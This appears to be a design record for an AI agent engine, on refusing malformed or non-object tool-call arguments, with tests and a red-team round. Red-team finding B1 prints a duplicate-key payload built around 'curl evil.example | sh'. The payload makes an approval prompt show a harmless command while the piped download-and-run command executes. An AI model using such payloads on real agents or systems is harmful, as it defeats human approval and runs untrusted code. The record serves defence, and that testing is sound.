# ADR-197 — Tool-call arguments that are not valid JSON are refused, never coerced to `{}`

- **Status**: **Proposed — design + implementation + proof (2026-09-25); red-teamed once (2026-09-26, §5:
  two MAJOR findings, both fixed); the fixes are not yet re-red-teamed.**
- **Date**: 2026-09-25
- **Origin**: GitHub issue #105, found by the agent test driver's first end-to-end run (ADR-182 §14,
  "First finding from the harness"). A scripted `echo` call with arguments `{not json` ran with `{}`,
  and the model got back "missing required field 'text'" instead of a parse error.
- **Implements**: 006 §3 step 2 ("validate — reject; do not coerce") and its non-negotiable property
  "Argument validation rejects, never coerces." 006 is accurate and is not amended.
- **Touches**: `include/agentengine/core/tool_call_extraction.hpp` (`tool_call_request_of`),
  `include/agentengine/core/tool_pipeline.hpp` (`ToolCallRequest::arguments_parse_error`,
  `malformed_arguments_error`, step 2 in `admit_call` and `background_task`).

## 1. The defect

```cpp
// before -- tool_call_request_of()
auto parsed = json::parse(call.arguments_json);
return ToolCallRequest{call.call_id, call.tool_name,
                       parsed ? *parsed : json::Value::make_object({}), ...};
```

Argument text that failed to parse became `{}`. For a tool with a required field the call then failed
at `schema::from_json<Args>` with a misleading message ("missing required field"). For a tool whose
arguments are **all optional**, `{}` is a valid call, so the tool **ran** on garbage model output.
That is exactly the coercion 006 §3 forbids, and it sits on model output, so it touches I3: model text
that does not even parse selected a real invocation with default arguments.

**Who could reach it.** Every tool call from a model goes through `tool_call_request_of()`: vendor
structured calls (OpenAI `function.arguments`, Anthropic `tool_use.input`, both streaming
accumulators), `text_derived` calls (response-format leak scan, middleware, hook rewrites), and the
ADR-029 approval-resume path, which rebuilds requests from history with the same helper. CodeAct's
`call_tool()` bridge already refused malformed JSON with `tool.malformed_arguments`
(`native_jail_backend.cpp`, `python_worker_mediation.cpp`); only the model-call path coerced.

## 2. Decision

**A tool call whose argument text is not valid JSON never reaches the tool.** It folds as an
ordinary tool error (a value, 006 §3 last property), with error code `tool.malformed_arguments` — the
code the CodeAct bridge already uses for the same condition, so one condition has one name. The
model sees `tool arguments are not valid JSON (<parser message>); the tool was not run -- resend the
call with a JSON object` and can retry.

Mechanism:

1. `tool_call_request_of()` no longer substitutes silently. On a parse failure it sets the new
   `ToolCallRequest::arguments_parse_error` (the parser's message; empty iff the text parsed).
   `arguments` stays `{}` only as a placeholder, because hooks and approval prompts need a value.
2. `admit_call()` refuses a request with a non-empty `arguments_parse_error` at step 2, right after
   resolve and **before** any capability is bound or any approval or policy is consulted.
   `invoke_tool()` and the ADR-160 parallel-batch path both go through `admit_call()`.
3. `background_task()` has its own step list (it does not call `admit_call()`), so it gets the same
   check at the same point. Both use one shared `malformed_arguments_error()`.

The flag, not a sentinel value in `arguments`, carries the refusal, so no `json::Value` a hook could
write can clear it: a hook that rewrites a malformed call's arguments is still refused (fail closed).
The field is appended last with a default, so every existing aggregate `ToolCallRequest{...}` (MCP
server, CodeAct bridge, tests) is unaffected; those callers already hold a parsed `json::Value`.

`failure_class::contract`, matching `tool.unknown_name`, the other step-1/2 refusal.

### Empty argument text means `{}`, deliberately

Empty or all-whitespace `arguments_json` still means `{}`. This is not coercion of garbage: there
is no text to misread, and an empty string is the natural wire form of a call with no arguments.
The adapters already treat it that way on most paths: both streaming accumulators map empty text to
`"{}"` (`openai/chat_client.hpp`, `anthropic/chat_client.hpp`), as does a missing OpenAI
`arguments` field; only a non-streamed OpenAI `"arguments": ""` reaches `tool_call_request_of()` as
`""`, and it now means the same thing on that path too. Refusing it would break no-argument tools for
no safety gain. Any non-blank text must parse.

~~Valid JSON that is not an object (`42`, `[1]`) is not this ADR's concern: it parses, and step 2's
shape check (`schema::from_json<Args>`) refuses it as before.~~ *Amended 2026-09-26 (§5, B2):* valid JSON
that is not an object is refused by `tool_call_request_of()` as well, with the same
`tool.malformed_arguments`, so the rule no longer depends on each tool's codec.

## 3. Proof

`tests/core/tools/test_tool_call_malformed_arguments.cpp` (ctest `test_tool_call_malformed_arguments`), with a
probe tool whose only argument is `std::optional<std::string>` — so `{}` is a valid call and only a
real step-2 refusal stops it:

| Check | What it proves |
|---|---|
| T1 | `{not json` through `invoke_tool`: the tool does not run; `is_error`; audit code `tool.malformed_arguments`; the model-visible message names invalid JSON |
| T2 | trailing garbage and a truncated object are refused the same way |
| T3 | `""` and whitespace-only arguments run the tool (the deliberate rule above) |
| T4 | control: `{"note":"hello"}` and `{}` run; valid text leaves `arguments_parse_error` empty |
| T5 | `admit_call()` (parallel path) and `background_task()` refuse it before binding or spawning; control: valid arguments background and complete |
| T6 | a real `AgentSession` round: the malformed call is a tool error, the run continues, the model's retry with valid arguments runs the tool exactly once |

Positive controls (run 2026-09-25, each restored by editing back):

1. `tool_call_request_of()` returned to the old coercion: T1, T2, T5 (both) and T6 fail.
2. only `admit_call()`'s check disabled: T1, T2, T5 (`admit_call`) and T6 fail.
3. only `background_task()`'s check disabled: T5 (`background_task`) fails.

**Scenario.** `tests/scenarios/scripted_malformed_arguments.json` (ctest
`scenario_scripted_malformed_arguments`), exported by `agentengine_test_driver`'s `scenario_export`
from a scripted `basic`-fixture session: `echo` with `{not json` → `tool_call_finished` `is_error`
with the not-valid-JSON message → the model retries with `{"text":"retry"}` → `echo` runs once → run
completes ok. Under the old coercion the golden does not match (the first result was "missing
required field 'text'"); ADR-182 §14 deliberately did not export this scenario until now, because a
golden would have locked the bug in.

## 4. Residuals

- ~~**A malformed call to an approval-gated tool still suspends for approval first.**~~ **Closed the same day**
  (same PR): `run_rounds`' suspend check and `resolve_hook_decision`'s cascade skip a call whose
  `arguments_parse_error` is set, since it is refused at step 2 whatever anyone decides
  (`test_approval_resume` M1).
- `tool_call_started` is still emitted for the refused call (the session emits it before
  `invoke_tool`), paired with an error `tool_call_finished`. That is the existing shape for every
  step-1..5 refusal (unknown tool, capability not held, denial), not new behavior.
- Anthropic's outbound history translation (`translate_tool_use_input`) still sends `{}` for a
  historical `tool_use` whose text never parsed, because the wire requires an object there. That is
  replaying history, not running a tool; the call's result in the same history is the refusal.
- A host hook cannot repair malformed arguments (e.g. with a JSON-repair pass): the refusal is keyed
  on the original text. Deliberate; a repair seam would be its own ADR.

## 5. Red team round 1 (2026-09-26)

GitHub issue #112, red-team round 4 of the ADR-191..198 stack, with a compiled, executed probe. Two MAJOR
findings against this ADR (B3 and B4 of the same issue belong to ADR-198 and ADR-191).

| # | Sev | Finding | Disposition |
|---|---|---|---|
| B1 | major (I3) | `json::parse` kept duplicate object keys; `Value::find` (so `schema::from_json`, so dispatch) used the **first**, while JavaScript's `JSON.parse` and Python's `json.loads` take the **last**. `approval_requested` carries the raw text, so `{"cmd":"curl evil.example \| sh","cmd":"ls -la"}` could show an approval UI `ls -la` and run `curl` | **The parser refuses duplicate keys** (`json.duplicate_key`, `failure_class::contract`). Such arguments are now `arguments_parse_error` → `tool.malformed_arguments` at step 2, and ADR-197's M1 rule means they never suspend for approval |
| B2 | major (claim false) | OpenAI `function.arguments` present but not a string (object, number, `null`) became `"{}"` with no `arguments_parse_error`; an all-optional tool then ran on its defaults. Anthropic's `tool_use.input` had the same shape | **Only a missing field means `{}`.** A present non-string value is kept as its own JSON text; `tool_call_request_of()` refuses any text that parses to a non-object |

**B1, the parser rule.** RFC 8259 §4 says names "SHOULD be unique" and leaves duplicates' meaning to the
reader; readers disagree, which is exactly the ambiguity 006 §3 ("reject, do not coerce") forbids resolving.
Keys are compared after escape decoding (`"a"` and `"\u0061"` collide). The check runs once per completed
object: pairwise up to 16 members, and above that a sort of `string_view`s onto the finished keys, so a wide
adversarial object costs O(n log n), with n already bounded by `ParseBudget::max_nodes_visited`
(`test_json_value` DK6: two 40,000-key parses well under the bound).

*Callers of the parser, audited for anything that relies on duplicates.* Every `json::parse` in `include/`,
`src/`, `tools/` and `tests/`: model tool-call arguments (`tool_call_extraction.hpp`), provider responses and
SSE events (OpenAI, Anthropic, embedder), MCP/A2A/AG-UI JSON-RPC bodies, CodeAct `call_tool()` arguments,
recordings, checkpoints, message codec, the test driver's requests and scenarios, config and schema text.
None is a format that legitimately repeats a key: each is either produced by `json::dump` (whose input is a
`Value` that now cannot hold duplicates from a parse) or by an external party whose specification requires
unique names. All 24 checked-in `.json`/`.jsonl` files were scanned (Python `object_pairs_hook`): none has a
duplicate key. So **no opt-in** to accept duplicates was added; if a format ever needs one, it gets an
explicit parse option, never a weaker default. Consequence worth stating: a provider response or SSE event
with a duplicate key anywhere now fails to parse as a whole — a non-streamed response is an error, and a
streamed event is skipped like any other malformed event (pre-existing rule, residual below).

**B2, what the adapters do now.**

| Path | Missing | String | Object | Number / `null` / boolean / array |
|---|---|---|---|---|
| OpenAI non-streamed `function.arguments` | `{}` | the text | accepted, re-serialized | its JSON text → refused |
| OpenAI streamed `arguments` fragment | no fragment | appended | appended as JSON text | `null` = no fragment; others appended → refused |
| Anthropic non-streamed `tool_use.input` | `{}` | its JSON text → refused | the arguments | its JSON text → refused |
| Anthropic streamed `content_block_start.input` | nothing | → refused | the start of the buffer (`{}` = placeholder) | `null` = nothing; others → refused |
| Anthropic streamed `partial_json` | no fragment | appended | appended as JSON text | `null` = no fragment; others appended |
| `ScriptedChatClient`, test driver | `{}` | the text | (driver) re-serialized | (driver) its JSON text → refused |

*Why accept an OpenAI object as-is.* The OpenAI wire says `arguments` is a JSON string. Whether any
particular OpenAI-compatible server emits the object itself was not verified for this change (no dated
research note); the decision does not depend on it. An object is unambiguous: it is the arguments, and
re-serializing it is not a coercion (no information is invented or dropped; approval shows the same text
dispatch parses). Anything else has no argument-object reading at all, so it is refused. The streamed rule is
the same rule applied per fragment: a whole object in one delta parses; an object mixed with string fragments
does not, and is refused rather than resolved. A `null` delta carries no fragment — deltas omit or null
fields routinely — so a call whose every fragment is `null` or absent is still a no-argument call, the same
as the missing field. An Anthropic stream that gives an input both in `content_block_start` and as
`partial_json` is refused the same way (the concatenation does not parse).

*The choke point.* `tool_call_request_of()` now refuses text that parses to a non-object with
`arguments_parse_error = "got a JSON <kind>, not an object"`, so the model sees `tool arguments are not valid
JSON (got a JSON number, not an object); the tool was not run -- resend the call with a JSON object`. This
also covers the non-streamed OpenAI `"arguments": "42"` string, previously refused only by each tool's
`from_json` (a tool whose `Args` accepted any value would have run). Anthropic's outbound
`translate_tool_use_input` now sends `{}` for such a historical call, since the wire requires an object there.

**Checking the ADR's own claim.** §2 said "a missing OpenAI `arguments` field" maps to `{}`; it did not claim
that only a missing one did, but its rule ("no text to misread" is the one exception) excluded a present
value, and the code contradicted that. §2 stands; the adapters now match it.

**Proof.** `test_json_value` DK1-DK6 (duplicates refused incl. after escape decoding and when nested; same key
in different objects parses; a 40,000-key object parses and a duplicate at its end is refused; not quadratic;
memory-capped). `test_tool_call_malformed_arguments` T7 (non-object text refused, probe never runs), T8
(duplicate keys refused, message names the duplicate), T9 (the red team's P3: a duplicate-key call to an
`always_require` tool in a real `AgentSession` never raises `approval_requested` and never runs).
`test_openai_chat_client_translation` B2-O1..O4, B1-O5, B2-O6..O8; `test_anthropic_chat_client_translation`
B2-A1..A6.

Positive controls (2026-09-26; each fix reverted from a scratch backup, the check seen to fail, restored with
`cp`): see the list recorded in §5's closing paragraph after the run.

**Residuals.**
- A streamed SSE event that fails to parse (now including one with a duplicate key) is skipped, as before; if
  it carried an argument fragment, the assembled text differs from what the server meant. It is the server's
  envelope, not model text (the model cannot put a duplicate key into the provider's own JSON), and it is the
  pre-existing rule for every malformed event.
- The test driver's own MCP `tools/call` handler still treats non-object driver `arguments` as `{}`; that is
  the operator's harness API, not model output.
- MCP server-role `tools/call` passes a non-object `arguments` through to the tool's codec, which refuses it
  for every `AE_JSON_SCHEMA` type; it is not routed through `tool_call_request_of()`.
